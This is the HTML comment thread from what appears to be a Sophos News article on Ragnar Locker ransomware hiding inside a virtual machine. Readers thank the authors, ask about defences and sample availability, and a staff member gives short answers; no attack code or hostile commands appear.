					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/?replytocom=190597#respond' data-commentid="190597" data-postid="66749" data-belowelement="comment-190597" data-respondelement="respond" data-replyto="Reply to gallagherseanm" aria-label='Reply to gallagherseanm'>Reply</a>				</div>
			</div>

	</article></section></article></section></article></section></article>
		<article class="comment odd alt thread-even depth-1  " id="comment-187590" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-one.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-two.png 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													XavierFerrer											</h2>
					<time class="comment-meta-item" datetime="2020-05-23T18:55-04:00" itemprop="datePublished"><a href="#comment-187590" itemprop="url">23 May 2020 at 6:55 pm</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>Thanks , we should always share this kind of information to help others to be better protected.</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/?replytocom=187590#respond' data-commentid="187590" data-postid="66749" data-belowelement="comment-187590" data-respondelement="respond" data-replyto="Reply to XavierFerrer" aria-label='Reply to XavierFerrer'>Reply</a>				</div>
			</div>

	</article>
		<article class="comment even thread-odd thread-alt depth-1  " id="comment-187605" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-three.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-one.png 2x' class='avatar avatar-60 photo avatar-default' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													Bob											</h2>
					<time class="comment-meta-item" datetime="2020-05-23T22:11-04:00" itemprop="datePublished"><a href="#comment-187605" itemprop="url">23 May 2020 at 10:11 pm</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>Disable VM execute in bios. Take extra precautions on machines with bios set.</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/?replytocom=187605#respond' data-commentid="187605" data-postid="66749" data-belowelement="comment-187605" data-respondelement="respond" data-replyto="Reply to Bob" aria-label='Reply to Bob'>Reply</a>				</div>
			</div>

	</article>
		<article class="comment odd alt thread-even depth-1  " id="comment-187615" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-one.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-one.png 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													Aseem											</h2>
					<time class="comment-meta-item" datetime="2020-05-24T01:00-04:00" itemprop="datePublished"><a href="#comment-187615" itemprop="url">24 May 2020 at 1:00 am</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>Thanks for sharing guys, great info and insights.</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/?replytocom=187615#respond' data-commentid="187615" data-postid="66749" data-belowelement="comment-187615" data-respondelement="respond" data-replyto="Reply to Aseem" aria-label='Reply to Aseem'>Reply</a>				</div>
			</div>

	</article>
		<article class="comment even thread-odd thread-alt depth-1  " id="comment-187655" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://secure.gravatar.com/avatar/766f1c53943d3c98eac6802708464e41?s=60&#038;d=blank&#038;r=g' srcset='https://secure.gravatar.com/avatar/766f1c53943d3c98eac6802708464e41?s=120&#038;d=blank&#038;r=g 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													D-Mohsen											</h2>
					<time class="comment-meta-item" datetime="2020-05-24T07:04-04:00" itemprop="datePublished"><a href="#comment-187655" itemprop="url">24 May 2020 at 7:04 am</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>That was very interesting.<br />
Thanks for the impressive information</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/?replytocom=187655#respond' data-commentid="187655" data-postid="66749" data-belowelement="comment-187655" data-respondelement="respond" data-replyto="Reply to D-Mohsen" aria-label='Reply to D-Mohsen'>Reply</a>				</div>
			</div>

	</article>
		<article class="comment odd alt thread-even depth-1 parent " id="comment-187662" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-three.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-two.png 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													P H											</h2>
					<time class="comment-meta-item" datetime="2020-05-24T07:58-04:00" itemprop="datePublished"><a href="#comment-187662" itemprop="url">24 May 2020 at 7:58 am</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>Good article. What do you think is a way to protect our machines from this type of attack, for people who arent by profession in threat intelligence. Obviously apart from &#8220;not downloading anything from unknown sources&#8221;.</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/?replytocom=187662#respond' data-commentid="187662" data-postid="66749" data-belowelement="comment-187662" data-respondelement="respond" data-replyto="Reply to P H" aria-label='Reply to P H'>Reply</a>				</div>
			</div>

	<section class="child-comments comments-list">
		<article class="comment even depth-2  " id="comment-187988" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-one.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-two.png 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													George Fleming											</h2>
					<time class="comment-meta-item" datetime="2020-05-27T02:33-04:00" itemprop="datePublished"><a href="#comment-187988" itemprop="url">27 May 2020 at 2:33 am</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>Good question, I was wondering about it too.  The technical information in this article is amazing to me, since I don&#8217;t know anything about it.  I would just like to know whether the standard anti-virus and anti-malware programs would protect against these infestations.</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/?replytocom=187988#respond' data-commentid="187988" data-postid="66749" data-belowelement="comment-187988" data-respondelement="respond" data-replyto="Reply to George Fleming" aria-label='Reply to George Fleming'>Reply</a>				</div>
			</div>

	</article></section></article>
		<article class="comment odd alt thread-odd thread-alt depth-1  " id="comment-187664" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-three.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-three.png 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													Tom											</h2>
					<time class="comment-meta-item" datetime="2020-05-24T08:29-04:00" itemprop="datePublished"><a href="#comment-187664" itemprop="url">24 May 2020 at 8:29 am</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>How did they get amin privileges on the host and guest in the first place.?    Poor security at the edge.</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/?replytocom=187664#respond' data-commentid="187664" data-postid="66749" data-belowelement="comment-187664" data-respondelement="respond" data-replyto="Reply to Tom" aria-label='Reply to Tom'>Reply</a>				</div>
			</div>

	</article>
		<article class="comment even thread-even depth-1  " id="comment-187751" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-three.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-three.png 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													Dhiren Velari											</h2>
					<time class="comment-meta-item" datetime="2020-05-25T06:51-04:00" itemprop="datePublished"><a href="#comment-187751" itemprop="url">25 May 2020 at 6:51 am</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>Insightful research as always. Keep up the great work Sophos labs.</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/?replytocom=187751#respond' data-commentid="187751" data-postid="66749" data-belowelement="comment-187751" data-respondelement="respond" data-replyto="Reply to Dhiren Velari" aria-label='Reply to Dhiren Velari'>Reply</a>				</div>
			</div>

	</article>
		<article class="comment odd alt thread-odd thread-alt depth-1  " id="comment-187957" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-one.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-one.png 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													Shubham Dayma											</h2>
					<time class="comment-meta-item" datetime="2020-05-26T16:48-04:00" itemprop="datePublished"><a href="#comment-187957" itemprop="url">26 May 2020 at 4:48 pm</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>Thank you for sharing this and working on this article. This makes us to be prepare for this kind of technique with the help of technology.</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/?replytocom=187957#respond' data-commentid="187957" data-postid="66749" data-belowelement="comment-187957" data-respondelement="respond" data-replyto="Reply to Shubham Dayma" aria-label='Reply to Shubham Dayma'>Reply</a>				</div>
			</div>

	</article>
		<article class="comment even thread-even depth-1  " id="comment-188067" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-one.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-one.png 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													Alta											</h2>
					<time class="comment-meta-item" datetime="2020-05-27T20:39-04:00" itemprop="datePublished"><a href="#comment-188067" itemprop="url">27 May 2020 at 8:39 pm</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>Is it possible to get the Malware file anywhere? I would need it for research purposes.</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/?replytocom=188067#respond' data-commentid="188067" data-postid="66749" data-belowelement="comment-188067" data-respondelement="respond" data-replyto="Reply to Alta" aria-label='Reply to Alta'>Reply</a>				</div>
			</div>

	</article>
		<article class="comment odd alt thread-odd thread-alt depth-1  " id="comment-188109" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-two.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-two.png 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													Joseph											</h2>
					<time class="comment-meta-item" datetime="2020-05-28T04:07-04:00" itemprop="datePublished"><a href="#comment-188109" itemprop="url">28 May 2020 at 4:07 am</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>Security first, then others would follow, thanks for current information</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/?replytocom=188109#respond' data-commentid="188109" data-postid="66749" data-belowelement="comment-188109" data-respondelement="respond" data-replyto="Reply to Joseph" aria-label='Reply to Joseph'>Reply</a>				</div>
			</div>

	</article>
		<article class="comment even thread-even depth-1  " id="comment-188317" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-two.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-three.png 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													Pete											</h2>
					<time class="comment-meta-item" datetime="2020-05-28T21:26-04:00" itemprop="datePublished"><a href="#comment-188317" itemprop="url">28 May 2020 at 9:26 pm</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>Wow, I actually understood, the process. Well Written. How does the malware gain root/admin level access?</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/?replytocom=188317#respond' data-commentid="188317" data-postid="66749" data-belowelement="comment-188317" data-respondelement="respond" data-replyto="Reply to Pete" aria-label='Reply to Pete'>Reply</a>				</div>
			</div>

	</article>
		<article class="comment odd alt thread-odd thread-alt depth-1 parent " id="comment-188335" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-two.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-one.png 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													DLit											</h2>
					<time class="comment-meta-item" datetime="2020-05-29T05:18-04:00" itemprop="datePublished"><a href="#comment-188335" itemprop="url">29 May 2020 at 5:18 am</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>How come with the domain admin rights the attackers failed to stop the AV? Is there a possibility that the attackers managed to stopped the AV service from other vendors?</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/?replytocom=188335#respond' data-commentid="188335" data-postid="66749" data-belowelement="comment-188335" data-respondelement="respond" data-replyto="Reply to DLit" aria-label='Reply to DLit'>Reply</a>				</div>
			</div>

	<section class="child-comments comments-list">
		<article class="comment byuser comment-author-gallagherseanm even depth-2  bystaff" id="comment-190600" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://secure.gravatar.com/avatar/35c7478cbf1cc9258bcf7e56d2bea541?s=60&#038;d=blank&#038;r=g' srcset='https://secure.gravatar.com/avatar/35c7478cbf1cc9258bcf7e56d2bea541?s=120&#038;d=blank&#038;r=g 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													gallagherseanm											</h2>
					<time class="comment-meta-item" datetime="2020-06-15T14:41-04:00" itemprop="datePublished"><a href="#comment-190600" itemprop="url">15 June 2020 at 2:41 pm</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>The attackers did shut down some AV services. CryptoGuard was not affected.</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/?replytocom=190600#respond' data-commentid="190600" data-postid="66749" data-belowelement="comment-190600" data-respondelement="respond" data-replyto="Reply to gallagherseanm" aria-label='Reply to gallagherseanm'>Reply</a>				</div>
			</div>

	</article></section></article>
		<article class="comment odd alt thread-even depth-1 parent " id="comment-188428" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-two.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-two.png 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													Abs											</h2>
					<time class="comment-meta-item" datetime="2020-05-30T05:49-04:00" itemprop="datePublished"><a href="#comment-188428" itemprop="url">30 May 2020 at 5:49 am</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>Was this attack details uncovered from researching &#8220;Energias de Portugal (EDP) Ransomware Attack&#8221;?</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/?replytocom=188428#respond' data-commentid="188428" data-postid="66749" data-belowelement="comment-188428" data-respondelement="respond" data-replyto="Reply to Abs" aria-label='Reply to Abs'>Reply</a>				</div>
			</div>

	<section class="child-comments comments-list">
		<article class="comment byuser comment-author-gallagherseanm even depth-2  bystaff" id="comment-190599" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://secure.gravatar.com/avatar/35c7478cbf1cc9258bcf7e56d2bea541?s=60&#038;d=blank&#038;r=g' srcset='https://secure.gravatar.com/avatar/35c7478cbf1cc9258bcf7e56d2bea541?s=120&#038;d=blank&#038;r=g 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													gallagherseanm											</h2>
					<time class="comment-meta-item" datetime="2020-06-15T14:40-04:00" itemprop="datePublished"><a href="#comment-190599" itemprop="url">15 June 2020 at 2:40 pm</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>The attack was discovered because it was detected by CryptoGuard.</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/?replytocom=190599#respond' data-commentid="190599" data-postid="66749" data-belowelement="comment-190599" data-respondelement="respond" data-replyto="Reply to gallagherseanm" aria-label='Reply to gallagherseanm'>Reply</a>				</div>
			</div>

	</article></section></article>
		<article class="comment odd alt thread-odd thread-alt depth-1 parent " id="comment-190334" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://secure.gravatar.com/avatar/69b6f49e0f866a56acf7f4b6a45c10e0?s=60&#038;d=blank&#038;r=g' srcset='https://secure.gravatar.com/avatar/69b6f49e0f866a56acf7f4b6a45c10e0?s=120&#038;d=blank&#038;r=g 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													<a class="comment-author-link" href="http://relativity.com" itemprop="author">Darian Lewis</a>
											</h2>
					<time class="comment-meta-item" datetime="2020-06-11T19:33-04:00" itemprop="datePublished"><a href="#comment-190334" itemprop="url">11 June 2020 at 7:33 pm</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>Is it possible to get the sample you analyzed for further analysis?</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/?replytocom=190334#respond' data-commentid="190334" data-postid="66749" data-belowelement="comment-190334" data-respondelement="respond" data-replyto="Reply to Darian Lewis" aria-label='Reply to Darian Lewis'>Reply</a>				</div>
			</div>

	<section class="child-comments comments-list">
		<article class="comment byuser comment-author-gallagherseanm even depth-2  bystaff" id="comment-190850" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://secure.gravatar.com/avatar/35c7478cbf1cc9258bcf7e56d2bea541?s=60&#038;d=blank&#038;r=g' srcset='https://secure.gravatar.com/avatar/35c7478cbf1cc9258bcf7e56d2bea541?s=120&#038;d=blank&#038;r=g 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													gallagherseanm											</h2>
					<time class="comment-meta-item" datetime="2020-06-16T22:27-04:00" itemprop="datePublished"><a href="#comment-190850" itemprop="url">16 June 2020 at 10:27 pm</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>The samples were compiled specifically for the targeted victim, and the attack was ongoing at the time of the report. When we have clearance, we&#8217;ll share the sample with the community.</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/?replytocom=190850#respond' data-commentid="190850" data-postid="66749" data-belowelement="comment-190850" data-respondelement="respond" data-replyto="Reply to gallagherseanm" aria-label='Reply to gallagherseanm'>Reply</a>				</div>
			</div>

	</article></section></article></section>
		
	
	
		<div id="respond" class="comment-respond">
		<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/#respond" style="display:none;">Cancel reply</a></small></h3><form action="https://news.sophos.com/wp-comments-post.php" method="post" id="commentform" class="comment-form" novalidate><p class="comment-notes"><span id="email-notes">Your email address will not be published.</span></p><p class="comment-form-comment"><label for="comment">Comment</label> <textarea id="comment" name="comment" cols="45" rows="8" maxlength="65525" required="required"></textarea></p><p class="comment-form-author"><label for="author">Name</label> <input id="author" name="author" type="text" value="" size="30" maxlength="245" /></p>
<p class="comment-form-email"><label for="email">Email</label> <input id="email" name="email" type="email" value="" size="30" maxlength="100" aria-describedby="email-notes" /></p>
<p class="comment-form-url"><label for="url">Website</label> <input id="url" name="url" type="url" value="" size="30" maxlength="200" /></p>
<p class="comment-form-cookies-consent"><input id="wp-comment-cookies-consent" name="wp-comment-cookies-consent" type="checkbox" value="yes" /> <label for="wp-comment-cookies-consent">Save my name, email, and website in this browser for the next time I comment.</label></p>
<input type="hidden" name="redirect_to" value="https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/" id="redirect_to"><p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="Post Comment" /> <input type='hidden' name='comment_post_ID' value='66749' id='comment_post_ID' />
<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
</p><p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="0799766ae1" /></p><input type="hidden" id="ak_js" name="ak_js" value="103"/><textarea name="ak_hp_textarea" cols="45" rows="8" maxlength="100" style="display: none !important;"></textarea></form>	</div><!-- #respond -->
	
</div><!-- #comments -->

		
		</main><!-- #main -->
	</div><!-- #primary -->


<div id="secondary" class="widget-area" role="complementary">
			
		<div id="second-article-wrapper" class="article-wrapper">
			<h3 class="widget-title">You might also enjoy...</h3>
			<article id="post-72266" class="second-featured post-72266 post type-post status-publish format-standard has-post-thumbnail hentry category-mtr category-security-operations tag-mtr tag-ransomware tag-sidebar tag-sophos-managed-threat-response-mtr tag-sophos-mtr region-en-us">
	<div class="second-featured__image" style="background-image: url('https://news.sophos.com/wp-content/uploads/2020/08/sophos-news-ft-img-mtr_v3.png?w=640');">
		<div class="featured-entry-meta">
			<div class="featured-entry-date">
				<span class="day-num">03</span>
				<span class="month">Feb</span>
			</div>
		</div>
	</div>
	<div class="second-featured__content">
		<header class="featured-entry-header">
			<div class="featured-entry-categories">
					<a href="https://news.sophos.com/en-us/category/mtr/">MTR</a> &bull; <a href="https://news.sophos.com/en-us/category/security-operations/">Security Operations</a>			</div>
			<h1 class="featured-entry-title dot-ellipsis dot-resize-update dot-load-update dot-height-130"><a href="https://news.sophos.com/en-us/2021/02/03/mtr-casebook-uncovering-a-backdoor-implant-in-a-solarwinds-orion-server/" rel="bookmark">MTR casebook: Uncovering a backdoor implant in a SolarWinds Orion server</a></h1>		</header> <!-- featured-entry-header -->
	</div>
</article> <!-- post -->
<article id="post-72321" class="second-featured post-72321 post type-post status-publish format-standard has-post-thumbnail hentry category-products tag-sidebar tag-zero-trust tag-ztna region-en-us">
	<div class="second-featured__image" style="background-image: url('https://news.sophos.com/wp-content/uploads/2021/02/ZTNA-header.png?w=640');">
		<div class="featured-entry-meta">
			<div class="featured-entry-date">
				<span class="day-num">02</span>
				<span class="month">Feb</span>
			</div>
		</div>
	</div>
	<div class="second-featured__content">
		<header class="featured-entry-header">
			<div class="featured-entry-categories">
					<a href="https://news.sophos.com/en-us/category/products/">Sophos Products</a>			</div>
			<h1 class="featured-entry-title dot-ellipsis dot-resize-update dot-load-update dot-height-130"><a href="https://news.sophos.com/en-us/2021/02/02/sophos-zero-trust-network-access-ztna-is-coming-soon/" rel="bookmark">Sophos zero trust network access (ZTNA) is coming soon</a></h1>		</header> <!-- featured-entry-header -->
	</div>
</article> <!-- post -->
<article id="post-72021" class="second-featured post-72021 post type-post status-publish format-standard has-post-thumbnail hentry category-products tag-mtr tag-rapid-response tag-sidebar tag-sophos-mtr tag-sophos-rapid-response region-en-us">
	<div class="second-featured__image" style="background-image: url('https://news.sophos.com/wp-content/uploads/2020/08/sophos-news-ft-img-mtr_v1.png?w=640');">
		<div class="featured-entry-meta">
			<div class="featured-entry-date">
				<span class="day-num">19</span>
				<span class="month">Jan</span>
			</div>
		</div>
	</div>
	<div class="second-featured__content">
		<header class="featured-entry-header">
			<div class="featured-entry-categories">
					<a href="https://news.sophos.com/en-us/category/products/">Sophos Products</a>			</div>
			<h1 class="featured-entry-title dot-ellipsis dot-resize-update dot-load-update dot-height-130"><a href="https://news.sophos.com/en-us/2021/01/19/451-research-impact-report-on-sophos-rapid-response-service/" rel="bookmark">451 Research Impact Report on Sophos Rapid Response service</a></h1>		</header> <!-- featured-entry-header -->
	</div>
</article> <!-- post -->
<article id="post-71626" class="second-featured post-71626 post type-post status-publish format-standard has-post-thumbnail hentry category-products tag-edr tag-intercept-x-advanced-for-server-with-edr tag-intercept-x-with-edr tag-live-discover tag-sidebar region-en-us">
	<div class="second-featured__image" style="background-image: url('https://news.sophos.com/wp-content/uploads/2020/12/APIs-hero.png?w=640');">
		<div class="featured-entry-meta">
			<div class="featured-entry-date">
				<span class="day-num">17</span>
				<span class="month">Dec</span>
			</div>
		</div>
	</div>
	<div class="second-featured__content">
		<header class="featured-entry-header">
			<div class="featured-entry-categories">
					<a href="https://news.sophos.com/en-us/category/products/">Sophos Products</a>			</div>
			<h1 class="featured-entry-title dot-ellipsis dot-resize-update dot-load-update dot-height-130"><a href="https://news.sophos.com/en-us/2020/12/17/sophos-edr-live-discover-apis-are-now-generally-available/" rel="bookmark">Sophos EDR Live Discover APIs are now generally available</a></h1>		</header> <!-- featured-entry-header -->
	</div>
</article> <!-- post -->
		</div>

	</div> <!-- #secondary -->


		</div> <!-- .container -->
	</div> <!-- #content -->
	<footer>
		<section class="cta">
			<p>Start a Sophos demo in less than a minute. See exactly how our solutions work in a full environment without a commitment.</p>
			<a href="https://secure2.sophos.com/en-us/products/demos.aspx?cmp=70130000001xKqzAAE">Learn More</a>
		</section>
		<section class="connected">
			<div class="social">
				<h3>Stay Connected</h3>
				<ul>
					<li><a href="https://www.facebook.com/securitybysophos" target="_blank"><img src="https://www.sophos.com/en-us/medialibrary/SophosNext/Images/Navigation/Footer/facebook-icon.svg?la=en&amp;hash=1CA0A5A0E9C9999E7E079A5D32C86E9BF9C7AD1E" alt="Facebook"></a>
					</li>
					<li><a href="https://www.instagram.com/sophossecurity/" target="_blank"><img src="https://www.sophos.com/en-us/medialibrary/SophosNext/Images/Navigation/Footer/instagram-icon.svg?la=en&amp;hash=2B50C2B67C3023D9E7D4E1C3A16401EAD8F10F76" alt="Instagram"></a>
					</li>
					<li><a href="https://www.linkedin.com/company/sophos" target="_blank"><img src="https://www.sophos.com/en-us/medialibrary/SophosNext/Images/Navigation/Footer/linkedin-icon.svg?la=en&amp;hash=B6D5378C1E1A16F239A4C862EAE3499B8EC1F3F9" alt="LinkedIn"></a></li>
					<li><a href="https://www.sophos.com/en-us/company/rss-feeds.aspx"><img src="https://www.sophos.com/en-us/medialibrary/SophosNext/Images/Navigation/Footer/rss-icon.svg?la=en&amp;hash=76C4DAFD331DC675814191A66794A778D8C6DCF7" alt="RSS"></a></li>
					<li><a href="https://twitter.com/Sophos" target="_blank"><img src="https://www.sophos.com/en-us/medialibrary/SophosNext/Images/Navigation/Footer/twitter-icon.svg?la=en&amp;hash=9A90D9F99ABE6454741BBAAF9C3FB6966624C92D" alt="Twitter"></a></li>
